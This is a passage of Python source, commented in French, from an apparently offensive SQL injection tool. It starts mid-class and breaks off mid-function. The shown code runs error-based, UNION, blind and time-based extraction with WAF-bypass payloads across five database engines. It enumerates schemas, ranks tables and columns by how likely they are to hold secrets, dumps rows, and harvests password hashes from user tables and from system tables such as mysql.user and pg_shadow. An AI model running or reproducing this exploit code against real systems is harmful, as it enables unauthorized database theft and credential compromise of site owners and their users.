        """Extract via EXTRACTVALUE/UPDATEXML with WAF bypass fallback"""
        fn   = getattr(self, "_err_fn", "EXTRACTVALUE")
        PAGE = 30

        result = ""
        offset = 1
        while True:
            chunk_sql = f"SUBSTRING(({sql_expr}),{offset},{PAGE})"
            if fn == "UPDATEXML":
                plain_inj = f"AND UPDATEXML(1,CONCAT(0x7e,{chunk_sql},0x7e),1)"
            else:
                plain_inj = f"AND EXTRACTVALUE(1,CONCAT(0x7e,{chunk_sql},0x7e))"

            # Try plain, then 4 obfuscation levels
            chunk = None
            candidates = [
                plain_inj,
                obfuscate_sql(plain_inj, level=1),
                obfuscate_sql(plain_inj, level=2),
                inject_sql_comments(plain_inj, intensity=0.4),
                # MySQL /*!*/ version comment bypass
                plain_inj.replace("AND ", "/*!AND */").replace(
                    "EXTRACTVALUE", "/*!50000EXTRACTVALUE*/").replace(
                    "UPDATEXML", "/*!50000UPDATEXML*/"),
            ]
            for inj in candidates:
                resp  = self._req_payload(self._wrap(inj))
                chunk = _extract_error_value(resp)
                if chunk:
                    break

            if not chunk:
                break
            result += chunk
            if len(chunk) < PAGE:
                break
            offset += PAGE
            if offset > 4000:
                break

        return result if result else None

    # ── PostgreSQL CAST error extraction ─────────────────────────────────────
    def _pg_error_extract(self, sql_expr):
        """Extract via PostgreSQL CAST type mismatch errors"""
        PAGE = 50
        result = ""
        offset = 1
        while True:
            chunk_sql = f"SUBSTRING(({sql_expr}),{offset},{PAGE})"
            for inj in [
                f"AND CAST(({chunk_sql}) AS INT)=1",
                f"AND 1=CAST(({chunk_sql}) AS NUMERIC)",
                f"AND CAST(({chunk_sql}) AS INT)>0",
            ]:
                resp  = self._req_payload(self._wrap(inj))
                chunk = _extract_pg_cast(resp)
                if chunk:
                    break
            else:
                break
            result += chunk
            if len(chunk) < PAGE:
                break
            offset += PAGE
            if offset > 4000:
                break
        return result if result else None

    # ── MSSQL CONVERT error extraction ───────────────────────────────────────
    def _mssql_error_extract(self, sql_expr):
        """Extract via MSSQL CONVERT/CAST errors"""
        PAGE = 128
        result = ""
        offset = 1
        while True:
            chunk_sql = f"SUBSTRING(({sql_expr}),{offset},{PAGE})"
            for inj in [
                f"AND CONVERT(INT,({chunk_sql}))=1",
                f"AND CAST(({chunk_sql}) AS INT)=1",
                f"AND 1=CONVERT(INT,({chunk_sql}))",
            ]:
                resp  = self._req_payload(self._wrap(inj))
                chunk = _extract_mssql_convert(resp)
                if chunk:
                    break
            else:
                break
            result += chunk
            if len(chunk) < PAGE:
                break
            offset += PAGE
            if offset > 4000:
                break
        return result if result else None

    # ── UNION-based extraction ────────────────────────────────────────────────
    def _union_extract(self, sql_expr):
        """Extract via UNION SELECT — uses discovered col position"""
        if self.vis_col < 0 or self.num_cols == 0:
            return None
        cols = ["NULL"] * self.num_cols
        cols[self.vis_col] = f"CONCAT({HEX_MS},({sql_expr}),{HEX_ME})"
        nulls = ",".join(cols)

        for wrap_fn in [self._wrap_neg, self._wrap]:
            resp = self._req_payload(wrap_fn(f"UNION ALL SELECT {nulls}"))
            if resp and MARK_S in resp and MARK_E in resp:
                m = re.search(re.escape(MARK_S) + r"(.*?)" + re.escape(MARK_E), resp, re.DOTALL)
                if m:
                    return m.group(1)
        return None

    # ── Boolean blind extraction ──────────────────────────────────────────────
    def _blind_true(self, cond):
        """Returns True if condition evaluates to TRUE"""
        resp = self._req_payload(self._wrap(f"AND ({cond})"))
        base = self._req_payload(self._wrap("AND 1=1"))
        return bool(resp and base and not _responses_differ(resp, base, 0.04))

    def _blind_len(self, sql_expr, max_len=500):
        """Binary search for string length"""
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi) // 2
            if self._blind_true(f"LENGTH(({sql_expr}))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _blind_char(self, sql_expr, pos):
        """Binary search for character at pos (1-indexed)"""
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if self._blind_true(f"ASCII(SUBSTRING(({sql_expr}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo <= 126 else "?"

    def _blind_extract(self, sql_expr, max_len=200):
        """Full blind extraction — sequential with progress reports"""
        length = self._blind_len(sql_expr, max_len=max_len)
        if not length:
            return None
        self._cb("info", f"🗄️ Blind extract: {length} chars...")
        result = ""
        for i in range(1, length + 1):
            c = self._blind_char(sql_expr, i)
            result += c
            if i % 8 == 0:
                self._cb("info", f"🗄️  [{i}/{length}]: {result}")
        return result

    def _blind_extract_fast(self, sql_expr, max_len=200):
        """Parallel blind extraction — 5 concurrent threads for speed"""
        length = self._blind_len(sql_expr, max_len=max_len)
        if not length:
            return None
        self._cb("info", f"🗄️ Blind extract rapide (parallel): {length} chars...")
        result_arr = ["?"] * length
        lock = threading.Lock()

        def extract_pos(i):
            c = self._blind_char(sql_expr, i + 1)
            with lock:
                result_arr[i] = c
            return i, c

        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
            futures = [ex.submit(extract_pos, i) for i in range(length)]
            done = 0
            for f in concurrent.futures.as_completed(futures):
                f.result()
                done += 1
                if done % 10 == 0:
                    self._cb("info", f"🗄️  [{done}/{length}]: {''.join(result_arr[:done])}")

        return "".join(result_arr)

    # ── Time-based extraction ─────────────────────────────────────────────────
    def _time_extract(self, sql_expr, max_len=50):
        """Extract via timing-based binary search (slow — last resort)"""
        self._cb("warn", "🗄️ Time-based: extraction lente (~2s/char)...")
        ov     = self._ov()
        suffix = self.inj_suffix or "-- -"
        quote  = self._quote()

        # Choose sleep function
        if self.db_type == "PostgreSQL":
            sleep_fn = lambda n: f"pg_sleep({n})"
            sleep_cond = lambda expr, pos, mid: (
                f"1=(SELECT 1 FROM pg_sleep(CASE WHEN "
                f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid} THEN 2 ELSE 0 END))"
            )
        elif self.db_type == "MSSQL":
            sleep_fn = None
            def sleep_cond(expr, pos, mid):
                return f"1=1; IF ASCII(SUBSTRING(({expr}),{pos},1))>{mid} WAITFOR DELAY '0:0:2'-- -"
        else:  # MySQL
            def sleep_cond(expr, pos, mid):
                return f"IF(ASCII(SUBSTRING(({expr}),{pos},1))>{mid},SLEEP(2),0)"

        result = ""
        for pos in range(1, max_len + 1):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                cond = sleep_cond(sql_expr, pos, mid)
                payload = f"{ov}{quote} AND {cond}{suffix}"
                t0 = time.time()
                self._req_payload(payload)
                elapsed = time.time() - t0
                if elapsed >= 1.8:
                    lo = mid + 1
                else:
                    hi = mid
            if lo < 32 or lo > 126:
                break
            result += chr(lo)
            self._cb("info", f"🗄️  [{pos}]: {result}")
        return result or None

    # ── Universal query ───────────────────────────────────────────────────────
    def query(self, sql_expr):
        """Execute sql_expr using best available technique with fallback chain"""
        tech = self.technique
        result = None

        if tech == "error":
            result = self._error_extract(sql_expr)
        elif tech == "pg_error":
            result = self._pg_error_extract(sql_expr)
        elif tech == "mssql_error":
            result = self._mssql_error_extract(sql_expr)
        elif tech == "union":
            result = self._union_extract(sql_expr)
        elif tech == "blind":
            # Try fast parallel first, fallback to sequential
            result = self._blind_extract_fast(sql_expr)
            if not result:
                result = self._blind_extract(sql_expr)
        elif tech == "time":
            result = self._time_extract(sql_expr)

        # If primary technique failed, try fallback
        if not result and tech != "error":
            result = self._error_extract(sql_expr)
        if not result and tech not in ("union", "blind"):
            result = self._union_extract(sql_expr) if self.vis_col >= 0 else None
        if not result and tech != "blind":
            result = self._blind_extract(sql_expr)

        return result

    # ── Database info extraction ──────────────────────────────────────────────
    def extract_info(self):
        """Extract version, current DB, user, hostname, privileges"""
        self._cb("info", "🗄️ Extraction des informations DB...")
        queries = {
            "MySQL": {
                "version":    "SELECT @@version",
                "current_db": "SELECT database()",
                "user":       "SELECT user()",
                "hostname":   "SELECT @@hostname",
                "datadir":    "SELECT @@datadir",
                "privileges": "SELECT GROUP_CONCAT(PRIVILEGE_TYPE SEPARATOR ',') FROM information_schema.USER_PRIVILEGES WHERE GRANTEE=CONCAT(0x27,user(),0x27)",
                "global_privs": "SELECT GROUP_CONCAT(GRANT_OPTION SEPARATOR ',') FROM information_schema.USER_PRIVILEGES",
            },
            "PostgreSQL": {
                "version":    "SELECT version()",
                "current_db": "SELECT current_database()",
                "user":       "SELECT current_user",
                "superuser":  "SELECT usesuper FROM pg_user WHERE usename=current_user",
                "roles":      "SELECT string_agg(rolname,',') FROM pg_roles WHERE pg_has_role(current_user,rolname,'member')",
            },
            "MSSQL": {
                "version":    "SELECT @@version",
                "current_db": "SELECT DB_NAME()",
                "user":       "SELECT SYSTEM_USER",
                "is_sysadmin":"SELECT IS_SRVROLEMEMBER('sysadmin')",
                "linked_svrs":"SELECT name FROM master..sysservers WHERE srvid<>0",
            },
            "SQLite": {
                "version":    "SELECT sqlite_version()",
            },
            "Oracle": {
                "version":    "SELECT banner FROM v$version WHERE rownum=1",
                "current_db": "SELECT ora_database_name FROM dual",
                "user":       "SELECT user FROM dual",
                "privs":      "SELECT LISTAGG(PRIVILEGE,',') WITHIN GROUP (ORDER BY PRIVILEGE) FROM session_privs WHERE rownum<=20",
            },
        }
        info = {}
        for key, sql in queries.get(self.db_type, queries["MySQL"]).items():
            val = self.query(sql)
            if val:
                info[key] = val
                self._cb("found", f"🗄️ {key}: {val[:120]}")
                # Flag privilege escalation opportunities
                if "FILE" in str(val).upper():
                    self._cb("vuln", "🚨 Privilège FILE — lecture/écriture de fichiers système possible!")
                if "SUPER" in str(val).upper() or val.strip() == "1":
                    self._cb("vuln", "🚨 Privilège SUPER/DBA — accès root base de données!")
        return info

    # ── Database enumeration ──────────────────────────────────────────────────
    def extract_databases(self):
        """Enumerate all databases"""
        self._cb("info", "🗄️ Énumération des bases de données...")
        sql_map = {
            "MySQL":      "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR 0x7c7c) FROM information_schema.schemata",
            "PostgreSQL": "SELECT string_agg(datname,'||') FROM pg_database WHERE datistemplate=false",
            "MSSQL":      "SELECT STUFF((SELECT '||'+name FROM master..sysdatabases FOR XML PATH('')),1,2,'')",
            "SQLite":     None,  # SQLite is single-file
            "Oracle":     "SELECT LISTAGG(username,'||') WITHIN GROUP (ORDER BY username) FROM all_users",
        }
        sql = sql_map.get(self.db_type)
        if not sql:
            if self.db_type == "SQLite":
                self._cb("info", "🗄️ SQLite: base de données unique (fichier)")
                return ["main"]
            return []
        raw = self.query(sql)
        if not raw:
            return []
        dbs = [d.strip() for d in re.split(r'\|\|', raw) if d.strip()]
        self._cb("found", f"🗄️ Bases ({len(dbs)}): {', '.join(dbs[:20])}")
        return dbs

    # ── Table enumeration ─────────────────────────────────────────────────────
    def extract_tables(self, database=None):
        """Enumerate tables, sorted by sensitivity"""
        self._cb("info", f"🗄️ Tables{' de '+database if database else ''}...")
        if self.db_type == "MySQL":
            cond = f"table_schema=0x{database.encode().hex()}" if database else "table_schema=database()"
            sql  = (f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) "
                    f"FROM information_schema.tables WHERE {cond} AND table_type='BASE TABLE'")
        elif self.db_type == "PostgreSQL":
            sql = "SELECT string_agg(tablename,'||') FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema')"
        elif self.db_type == "MSSQL":
            sql = "SELECT STUFF((SELECT '||'+name FROM sysobjects WHERE xtype='U' FOR XML PATH('')),1,2,'')"
        elif self.db_type == "SQLite":
            sql = "SELECT GROUP_CONCAT(name,'||') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
        elif self.db_type == "Oracle":
            sql = "SELECT LISTAGG(table_name,'||') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE rownum<=200"
        else:
            sql = ("SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c7c) "
                   "FROM information_schema.tables WHERE table_schema=database()")

        raw = self.query(sql)
        if not raw:
            return []
        tables = [t.strip() for t in re.split(r'\|\|', raw) if t.strip()]

        # Sort: sensitive tables first
        def sensitivity_score(t):
            t_lower = t.lower()
            score = sum(3 for kw in ["pass", "cred", "secret", "auth"] if kw in t_lower)
            score += sum(2 for kw in ["user", "admin", "account", "member", "login"] if kw in t_lower)
            score += sum(1 for kw in ["token", "email", "payment", "order"] if kw in t_lower)
            return -score  # negative for descending sort

        tables.sort(key=sensitivity_score)
        self._cb("found", f"🗄️ Tables ({len(tables)}): {', '.join(tables[:25])}")
        return tables

    # ── Column enumeration ────────────────────────────────────────────────────
    def extract_columns(self, table, database=None):
        """Enumerate columns for a table"""
        self._cb("info", f"🗄️ Colonnes de '{table}'...")
        hex_tbl = "0x" + table.encode().hex()

        if self.db_type == "MySQL":
            cond = f"table_name={hex_tbl} AND table_schema={'0x'+database.encode().hex() if database else 'database()'}"
            sql  = f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c7c) FROM information_schema.columns WHERE {cond}"
        elif self.db_type == "PostgreSQL":
            sql = f"SELECT string_agg(column_name,'||') FROM information_schema.columns WHERE table_name='{table}' AND table_schema='public'"
        elif self.db_type == "MSSQL":
            sql = f"SELECT STUFF((SELECT '||'+name FROM syscolumns WHERE id=OBJECT_ID('{table}') FOR XML PATH('')),1,2,'')"
        elif self.db_type == "SQLite":
            sql = f"SELECT GROUP_CONCAT(name,'||') FROM pragma_table_info('{table}')"
        elif self.db_type == "Oracle":
            sql = f"SELECT LISTAGG(column_name,'||') WITHIN GROUP (ORDER BY column_id) FROM all_tab_columns WHERE table_name=UPPER('{table}')"
        else:
            sql = f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c7c) FROM information_schema.columns WHERE table_name={hex_tbl}"

        raw = self.query(sql)
        if not raw:
            return []
        cols = [c.strip() for c in re.split(r'\|\|', raw) if c.strip()]

        # Sort: sensitive columns first
        def col_score(c):
            c_lower = c.lower()
            score = sum(5 for kw in ["pass", "pwd", "secret", "hash", "salt"] if kw in c_lower)
            score += sum(3 for kw in ["email", "user", "login", "token", "key"] if kw in c_lower)
            score += sum(1 for kw in ["name", "id", "date", "status"] if kw in c_lower)
            return -score

        cols.sort(key=col_score)
        self._cb("found", f"🗄️ Colonnes de '{table}': {', '.join(cols[:20])}")
        return cols

    # ── Row count helper ──────────────────────────────────────────────────────
    def _count_table_rows(self, table):
        """Get row count before dump — prevents wasted extraction on empty tables"""
        safe = re.sub(r'[^a-zA-Z0-9_]', '', table)
        if not safe:
            return None
        try:
            if self.db_type == "MySQL":
                sql = f"SELECT COUNT(*) FROM `{safe}`"
            elif self.db_type == "PostgreSQL":
                sql = f'SELECT COUNT(*) FROM "{safe}"'
            elif self.db_type == "MSSQL":
                sql = f"SELECT COUNT(*) FROM [{safe}]"
            elif self.db_type == "SQLite":
                sql = f"SELECT COUNT(*) FROM '{safe}'"
            elif self.db_type == "Oracle":
                sql = f"SELECT COUNT(*) FROM {safe.upper()}"
            else:
                sql = f"SELECT COUNT(*) FROM `{safe}`"
            raw = self.query(sql)
            if raw:
                m = re.search(r'\d+', raw.strip())
                if m:
                    return int(m.group())
        except Exception:
            pass
        return None

    # ── Table dump ────────────────────────────────────────────────────────────
    def dump_table(self, table, columns, limit=50):
        """
        Dump rows — fixed separator collisions, correct multi-col extraction.
        Uses ASCII FS/GS (0x1c/0x1d) as separators — never appear in real data.
        Blind/time-based: extracts each column individually to avoid separator issues.
        """
        safe_cols = [c for c in columns if re.match(r'^[a-zA-Z0-9_]+$', c)]
        if not safe_cols:
            return []

        # Check row count first — skip empty tables
        count = self._count_table_rows(table)
        if count is not None:
            if count == 0:
                self._cb("info", f"🗄️ Table '{table}' vide (0 lignes)")
                return []
            actual_limit = min(limit, count)
            self._cb("info", f"🗄️ Dump '{table}' — {count} ligne(s) au total, extraction: {actual_limit}")
        else:
            actual_limit = limit
            self._cb("info", f"🗄️ Dump '{table}' ({', '.join(safe_cols[:5])})... [limit={limit}]")

        rows = []

        # Helper: detect + report hashes in a row
        def _check_hashes(row_dict):
            for col, val in row_dict.items():
                if val and str(val).strip() not in ("", "NULL"):
                    htype = _identify_hash(str(val))
                    if htype:
                        self._cb("vuln", f"🔑 Hash {htype} dans {table}.{col}: {str(val)[:60]}")

        # ── MySQL: batch extraction with ASCII control-char separators ────────
        if self.db_type == "MySQL" and self.technique not in ("blind", "time"):
            # COL_SEP=0x1c (FS, ASCII 28), ROW_SEP=0x1d (GS, ASCII 29)
            # These bytes CANNOT appear in usernames, emails, or passwords
            parts      = [f"IFNULL({c},0x4e554c4c)" for c in safe_cols]
            concat_row = f"CONCAT_WS({COL_SEP_HEX},{','.join(parts)})"
            sql = (f"SELECT GROUP_CONCAT({concat_row} ORDER BY 1 SEPARATOR {ROW_SEP_HEX}) "
                   f"FROM (SELECT {','.join(safe_cols)} FROM `{table}` LIMIT {actual_limit}) t__")
            raw = self.query(sql)
            if raw:
                for row_str in raw.split(ROW_SEP_CHAR):
                    if not row_str:
                        continue
                    parts_r = row_str.split(COL_SEP_CHAR)
                    row = {}
                    for col, val in zip(safe_cols, parts_r[:len(safe_cols)]):
                        v = val.strip()
                        row[col] = None if (not v or v == "NULL") else v
                    if any(v for v in row.values()):
                        rows.append(row)
                        _check_hashes(row)

        # ── Non-MySQL (error/union): concat all cols per row with chr(28) ─────
        elif self.db_type != "MySQL" and self.technique not in ("blind", "time"):
            for offset in range(actual_limit):
                if self.db_type == "PostgreSQL":
                    concat_parts = [f"COALESCE(CAST({c} AS TEXT),'')" for c in safe_cols]
                    concat_expr  = " || chr(28) || ".join(concat_parts)
                    sql = f"SELECT {concat_expr} FROM {table} LIMIT 1 OFFSET {offset}"

                elif self.db_type == "MSSQL":
                    concat_parts = [f"ISNULL(CAST({c} AS NVARCHAR(MAX)),'')" for c in safe_cols]
                    concat_expr  = " + CHAR(28) + ".join(concat_parts)
                    sql = (f"SELECT TOP 1 {concat_expr} FROM {table} "
                           f"ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY")

                elif self.db_type == "SQLite":
                    concat_parts = [f"IFNULL(CAST({c} AS TEXT),'')" for c in safe_cols]
                    concat_expr  = " || char(28) || ".join(concat_parts)
                    sql = f"SELECT {concat_expr} FROM '{table}' LIMIT 1 OFFSET {offset}"

                elif self.db_type == "Oracle":
                    # Oracle: inner query exposes raw cols, outer applies concat
                    inner_cols   = ", ".join(safe_cols)
                    concat_parts = [f"NVL(TO_CHAR({c}),'')" for c in safe_cols]
                    concat_expr  = " || chr(28) || ".join(concat_parts)
                    sql = (f"SELECT {concat_expr} FROM "
                           f"(SELECT {inner_cols}, ROWNUM rn__ FROM {table} WHERE ROWNUM <= {offset+1}) "
                           f"WHERE rn__ = {offset+1}")

                else:
                    # Generic MySQL-compatible fallback
                    concat_parts = [f"IFNULL(CAST({c} AS CHAR),'')" for c in safe_cols]
                    concat_expr  = f"CONCAT_WS({COL_SEP_HEX},{','.join(concat_parts)})"
                    sql = f"SELECT {concat_expr} FROM `{table}` LIMIT 1 OFFSET {offset}"

                row_raw = self.query(sql)
                if not row_raw:
                    break
                parts_r = row_raw.split(COL_SEP_CHAR)
                row = {}
                for col, val in zip(safe_cols, parts_r[:len(safe_cols)]):
                    v = val.strip() if val else ""
                    row[col] = None if (not v or v == "NULL") else v
                if not any(v for v in row.values()):
                    break  # All nulls = past end of table
                rows.append(row)
                _check_hashes(row)

        # ── Blind / time-based: one column per query (accurate, slower) ───────
        else:
            for offset in range(actual_limit):
                row = {}
                any_val = False
                for col in safe_cols:
                    if self.db_type == "MySQL":
                        sql = f"SELECT IFNULL(`{col}`,'') FROM `{table}` LIMIT 1 OFFSET {offset}"
                    elif self.db_type == "PostgreSQL":
                        sql = f"SELECT COALESCE(CAST({col} AS TEXT),'') FROM {table} LIMIT 1 OFFSET {offset}"
                    elif self.db_type == "MSSQL":
                        sql = (f"SELECT ISNULL(CAST({col} AS NVARCHAR(MAX)),'') FROM {table} "
                               f"ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY")
                    elif self.db_type == "SQLite":
                        sql = f"SELECT IFNULL(CAST({col} AS TEXT),'') FROM '{table}' LIMIT 1 OFFSET {offset}"
                    elif self.db_type == "Oracle":
                        sql = (f"SELECT NVL(TO_CHAR({col}),'') FROM "
                               f"(SELECT {col}, ROWNUM rn__ FROM {table} WHERE ROWNUM <= {offset+1}) "
                               f"WHERE rn__ = {offset+1}")
                    else:
                        sql = f"SELECT IFNULL(`{col}`,'') FROM `{table}` LIMIT 1 OFFSET {offset}"
                    val = self.query(sql)
                    if val and val.strip() and val.strip() not in ("NULL", ""):
                        row[col] = val.strip()
                        any_val = True
                    else:
                        row[col] = None
                if not any_val:
                    break
                rows.append(row)
                _check_hashes(row)

        self._cb("found", f"🗄️ {len(rows)} ligne(s) extraite(s) de '{table}'")
        return rows

    # ── MySQL system user dump ────────────────────────────────────────────────
    def _dump_mysql_users(self):
        """Dump mysql.user — requires DBA or FILE privilege. Graceful fail if denied."""
        self._cb("info", "🗄️ Tentative d'extraction mysql.user (comptes système)...")
        results = []
        # Try MySQL 8.x first (authentication_string), then 5.x (Password + auth_string)
        queries = [
            # MySQL 8.x / MariaDB
            (f"SELECT GROUP_CONCAT(CONCAT_WS({COL_SEP_HEX},User,Host,authentication_string) "
             f"ORDER BY User SEPARATOR {ROW_SEP_HEX}) FROM mysql.`user`"),
            # MySQL 5.x fallback
            (f"SELECT GROUP_CONCAT(CONCAT_WS({COL_SEP_HEX},User,Host,Password,authentication_string) "
             f"ORDER BY User SEPARATOR {ROW_SEP_HEX}) FROM mysql.`user`"),
        ]
        for sql in queries:
            raw = self.query(sql)
            if not raw or not raw.strip() or raw.strip() in ("NULL", ""):
                continue
            for row_str in raw.split(ROW_SEP_CHAR):
                if not row_str.strip():
                    continue
                parts = row_str.split(COL_SEP_CHAR)
                user = parts[0].strip() if parts else ""
                host = parts[1].strip() if len(parts) > 1 else "%"
                # Pick first non-empty password field
                pw = ""
                for p in parts[2:]:
                    if p.strip() and p.strip() not in ("NULL", ""):
                        pw = p.strip()
                        break
                if not user:
                    continue
                htype = _identify_hash(pw) if pw else None
                display = f"{user}@{host}"
                results.append({
                    "username": display,
                    "password": pw or None,
                    "hash_type": htype,
                    "table": "mysql.user"
                })
                msg = f"🔑 mysql.user: {display} — {pw[:60] if pw else '(no password)'}"
                if htype:
                    msg += f" [{htype}]"
                self._cb("vuln", msg)
            if results:
                break  # Got data from first working query
        if results:
            self._cb("vuln", f"🚨 {len(results)} compte(s) MySQL système extraits!")
        return results

    # ── PostgreSQL system user dump ───────────────────────────────────────────
    def _dump_pg_shadow(self):
        """Dump pg_shadow — requires superuser. Graceful fail if denied."""
        self._cb("info", "🗄️ Tentative d'extraction pg_shadow (PostgreSQL)...")
        results = []
        sql = (f"SELECT string_agg(usename || chr(28) || COALESCE(passwd,'') || chr(28) || "
               f"CASE WHEN usesuper THEN 'superuser' ELSE 'user' END, chr(29)) "
               f"FROM pg_shadow")
        raw = self.query(sql)
        if not raw or not raw.strip():
            return results
        for row_str in raw.split(ROW_SEP_CHAR):
            parts = row_str.split(COL_SEP_CHAR)
            user  = parts[0].strip() if parts else ""
            pw    = parts[1].strip() if len(parts) > 1 else ""
            role  = parts[2].strip() if len(parts) > 2 else ""
            if not user:
                continue
            htype = _identify_hash(pw) if pw else None
            display = user + (" (superuser)" if role == "superuser" else "")
            results.append({
                "username": display,
                "password": pw or None,
                "hash_type": htype or ("PostgreSQL MD5" if pw.startswith("md5") else None),
                "table": "pg_shadow"
            })
            msg = f"🔑 pg_shadow: {display} — {pw[:60] if pw else '(no hash)'}"
            if htype:
                msg += f" [{htype}]"
            self._cb("vuln", msg)
        if results:
            self._cb("vuln", f"🚨 {len(results)} compte(s) PostgreSQL extraits!")
        return results

    # ── MSSQL system login dump ───────────────────────────────────────────────
    def _dump_mssql_logins(self):
        """Dump sys.sql_logins — requires sysadmin. Graceful fail if denied."""
        self._cb("info", "🗄️ Tentative d'extraction sys.sql_logins (MSSQL)...")
        results = []
        sql = ("SELECT STUFF((SELECT CHAR(29)+name+CHAR(28)+"
               "ISNULL(CONVERT(NVARCHAR(MAX),password_hash,2),'')+CHAR(28)+"
               "CASE is_disabled WHEN 1 THEN 'disabled' ELSE "
               "CASE IS_SRVROLEMEMBER('sysadmin',name) WHEN 1 THEN 'sysadmin' ELSE 'user' END END "
               "FROM sys.sql_logins ORDER BY name FOR XML PATH('')),1,1,'')")
        raw = self.query(sql)
        if not raw or not raw.strip():
            return results
        for row_str in raw.split(ROW_SEP_CHAR):
            parts = row_str.split(COL_SEP_CHAR)
            user  = parts[0].strip() if parts else ""
            pw    = parts[1].strip() if len(parts) > 1 else ""
            role  = parts[2].strip() if len(parts) > 2 else ""
            if not user:
                continue
            results.append({
                "username": user + (f" ({role})" if role in ("sysadmin", "disabled") else ""),
                "password": pw or None,
                "hash_type": "MSSQL hash" if pw else None,
                "table": "sys.sql_logins"
            })
            self._cb("vuln", f"🔑 sys.sql_logins: {user} ({role}) — {pw[:60] if pw else '(no hash)'}")
        if results:
            self._cb("vuln", f"🚨 {len(results)} compte(s) MSSQL extraits!")
        return results

    # ── Smart credential extraction ───────────────────────────────────────────
    def extract_credentials(self):
        """
        Pro-level: automatically find and dump credential tables.
        Prioritizes tables/columns with user/password keywords.
        Identifies all hash types found.
        """
        self._cb("info", "🔑 Extraction intelligente des identifiants...")
        tables = self.extract_tables()
        if not tables:
            return {}

        # Score and select best tables
        cred_candidates = []
        for t in tables:
            tl = t.lower()
            score = 0
            score += 6 * sum(1 for kw in ["pass", "cred", "secret"] if kw in tl)
            score += 4 * sum(1 for kw in ["user", "admin", "account", "auth", "login", "member"] if kw in tl)
            score += 2 * sum(1 for kw in ["token", "key", "email"] if kw in tl)
            if score > 0:
                cred_candidates.append((score, t))

        cred_candidates.sort(reverse=True)
        # Always include first 3 tables if no creds found via score
        if not cred_candidates:
            cred_candidates = [(1, t) for t in tables[:3]]

        results = {}
        hashes_found = []
        creds_found  = []

        for _, table in cred_candidates[:6]:
            cols = self.extract_columns(table)
            if not cols:
                continue

            # Sort columns: password/email/username first
            prio, other = [], []
            for c in cols:
                cl = c.lower()
                if any(kw in cl for kw in ["pass", "pwd", "secret", "hash", "salt", "token"]):
                    prio.insert(0, c)
                elif any(kw in cl for kw in ["user", "name", "email", "login", "id"]):
                    prio.append(c)
                else:
                    other.append(c)
            dump_cols = (prio + other)[:10]

            rows = self.dump_table(table, dump_cols, limit=30)
            results[table] = {"columns": cols, "rows": rows}

            for row in rows:
                # Detect credentials pairs
                user_val = None
                pass_val = None
                for col, val in row.items():
                    cl = col.lower()
                    if any(kw in cl for kw in ["user", "login", "email", "name"]):
                        user_val = val
                    if any(kw in cl for kw in ["pass", "pwd", "hash", "secret"]):
                        pass_val = val

                if user_val and pass_val:
                    htype = _identify_hash(str(pass_val))
                    cred_str = f"{user_val} : {str(pass_val)[:80]}"
                    if htype:
                        cred_str += f" [{htype}]"
                        hashes_found.append({"user": user_val, "hash": pass_val, "type": htype, "table": table})
                    creds_found.append({"username": user_val, "password": pass_val, "hash_type": htype, "table": table})
                    self._cb("vuln", f"🔑 CREDENTIALS: {cred_str}")

        if hashes_found:
            self._cb("vuln", f"🚨 {len(hashes_found)} hash(s) de mot de passe trouvé(s) — crack avec hashcat/john")
        if creds_found:
            self._cb("vuln", f"🚨 {len(creds_found)} paire(s) identifiants extraites!")

        # ── System DB accounts (elevated privilege required — graceful fail) ──
        sys_creds = []
        try:
            if self.db_type == "MySQL":
                sys_creds = self._dump_mysql_users()
            elif self.db_type == "PostgreSQL":
                sys_creds = self._dump_pg_shadow()
            elif self.db_type == "MSSQL":
                sys_creds = self._dump_mssql_logins()
        except Exception:
            pass  # No privilege — silently skip

        for sc in sys_creds:
            htype = sc.get("hash_type")
            pw    = sc.get("password")
            if pw and htype:
                hashes_found.append({
                    "user":  sc["username"],
                    "hash":  pw,
                    "type":  htype,
                    "table": sc["table"],
                })
            # Avoid duplicates
            if sc not in creds_found:
                creds_found.append(sc)

        results["_creds_summary"] = creds_found
        results["_hashes"]        = hashes_found
        results["_sys_creds"]     = sys_creds
        return results


# ─── Public API ────────────────────────────────────────────────────────────────

def full_db_extraction(url, param=None, mode="enum", target_table=None,
                       method="GET", post_data=None, cookies=None,
                       callback=None, test_headers=False):
    """
    Main entry — professional SQLi detection + full data extraction.
    mode: "basic" → version+DB | "enum" → +tables | "dump" → +dump | "creds" → smart cred extraction
    """
    def cb(t, m):
        if callback:
            callback({"type": t, "message": m})

    results = {
        "injectable":      False,
        "technique":       None,
        "db_type":         "MySQL",
        "info":            {},
        "databases":       [],
        "tables":          [],
        "columns":         {},
        "dump":            {},
        "credentials":     {},
        "vulnerabilities": [],
    }

    if not HAS_REQUESTS:
        cb("warn", "🗄️ requests non disponible")
        return results

    cb("info", f"🗄️ SQLi v7.0 — {url}")

    inj = SQLInjector(url, param=param, method=method,
                      post_data=post_data or {}, cookies=cookies or {},
                      callback=callback, test_headers=test_headers)

    # Step 1: Find injection point
    if not inj.find_injection():
        cb("warn", "🗄️ Aucune injection SQL détectée")
        results["_scan_meta"] = {
            "params_tested":    getattr(inj, "_tested_params",  []),
            "headers_tested":   getattr(inj, "_tested_headers", []),
            "contexts_tested":  len(SQLInjector.CONTEXTS),
            "suffixes_tested":  len(SQLInjector.SUFFIXES),
            "vectors_total":    len(getattr(inj, "_tested_params", [])) * len(SQLInjector.CONTEXTS) * len(SQLInjector.SUFFIXES),
            "json_tested":      bool(post_data),
